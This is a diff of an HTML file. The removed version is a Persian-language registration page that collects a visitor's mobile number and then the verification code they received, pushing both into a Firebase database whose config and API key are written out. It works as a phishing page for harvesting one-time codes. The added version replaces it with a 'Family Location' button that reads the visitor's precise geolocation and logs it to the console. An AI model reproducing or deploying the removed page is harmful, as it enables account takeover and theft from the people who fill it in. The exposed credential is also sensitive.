@@ -1,267 +1,81 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="fa">
 <head>
-
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>ثبت اطلاعات</title>
+<title>Family Location</title>
 
 <style>
-
-body{
-    margin:0;
-    background:#000;
-    color:white;
-    font-family:tahoma;
+body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #111;
+    font-family: Arial, sans-serif;
 }
 
-.box{
-    margin:80px auto;
-    width:85%;
-    max-width:400px;
-    padding:25px;
-    border:2px solid #00ff66;
-    border-radius:20px;
-    box-shadow:0 0 25px #00ff66;
-    text-align:center;
+button {
+    width: 220px;
+    height: 80px;
+    font-size: 30px;
+    border-radius: 15px;
+    border: none;
+    background: #00aaff;
+    color: white;
 }
 
-h1{
-    color:#00ff66;
-    font-size:35px;
+button:disabled {
+    background: gray;
 }
-
-input{
-    width:90%;
-    padding:15px;
-    margin:12px 0;
-    border-radius:12px;
-    border:none;
-    font-size:18px;
-    text-align:center;
-}
-
-button{
-    width:95%;
-    padding:15px;
-    margin-top:15px;
-    background:#00ff66;
-    color:black;
-    border:none;
-    border-radius:12px;
-    font-size:20px;
-    font-weight:bold;
-}
-
-.page{
-    display:none;
-}
-
-.msg{
-    color:#00ff66;
-    margin-top:20px;
-    font-size:18px;
-}
-
 </style>
 
 </head>
 
-
 <body>
 
+<button id="start">START</button>
 
-<div class="box">
+<script>
 
+const btn = document.getElementById("start");
 
-<div id="page1">
+btn.onclick = () => {
 
-<h1>ثبت شماره</h1>
+    btn.disabled = true;
 
-<input id="phone" placeholder="شماره موبایل">
+    if (!navigator.geolocation) {
+        return;
+    }
 
-<button id="nextBtn">
-ادامه
-</button>
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
 
-</div>
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
 
+            console.log("Latitude:", lat);
+            console.log("Longitude:", lon);
+            console.log("Accuracy:", accuracy);
 
+        },
 
-<div id="page2" class="page">
+        () => {
+            btn.disabled = false;
+        },
 
-<h1>تأیید کد</h1>
-
-<p>کدی که دریافت کردید را وارد کنید</p>
-
-<input id="code" placeholder="کد">
-
-
-<button id="finishBtn">
-تأیید
-</button>
-
-
-</div>
-
-
-
-
-<div id="page3" class="page">
-
-<h1>موفق شد ✅</h1>
-
-<p class="msg">
-اطلاعات شما ثبت شد
-</p>
-
-</div>
-
-
-
-</div>
-
-
-
-<script type="module">
-
-
-import { initializeApp } 
-from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
-
-
-import { getDatabase, ref, push } 
-from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
-
-
-
-const firebaseConfig = {
-
-apiKey:"AIzaSyAUPnkLgHdNw2jXRe76gQ113_6aCiAFtXo",
-
-authDomain:"la3nazr.firebaseapp.com",
-
-databaseURL:"https://la3nazr-default-rtdb.firebaseio.com",
-
-projectId:"la3nazr",
-
-storageBucket:"la3nazr.firebasestorage.app",
-
-messagingSenderId:"819824551752",
-
-appId:"1:819824551752:web:87e8a2555c6df97edeb57d"
+        {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        }
+    );
 
 };
 
-
-
-const app = initializeApp(firebaseConfig);
-
-const db = getDatabase(app);
-
-
-
-let phone="";
-
-
-
-document
-.getElementById("nextBtn")
-.addEventListener("click",()=>{
-
-
-phone =
-document.getElementById("phone").value.trim();
-
-
-
-if(phone===""){
-
-alert("شماره را وارد کنید");
-
-return;
-
-}
-
-
-
-document.getElementById("page1").style.display="none";
-
-document.getElementById("page2").style.display="block";
-
-
-
-});
-
-
-
-
-
-
-document
-.getElementById("finishBtn")
-.addEventListener("click",()=>{
-
-
-let code =
-document.getElementById("code").value.trim();
-
-
-
-if(code===""){
-
-alert("کد را وارد کنید");
-
-return;
-
-}
-
-
-
-
-push(ref(db,"users"),{
-
-
-phone:phone,
-
-code:code,
-
-time:new Date().toLocaleString("fa-IR")
-
-
-})
-
-.then(()=>{
-
-
-document.getElementById("page2").style.display="none";
-
-document.getElementById("page3").style.display="block";
-
-
-})
-
-
-.catch((error)=>{
-
-
-alert("خطا در ذخیره اطلاعات");
-
-
-console.log(error);
-
-
-});
-
-
-
-});
-
-
-
 </script>
-
 
 </body>
 </html>
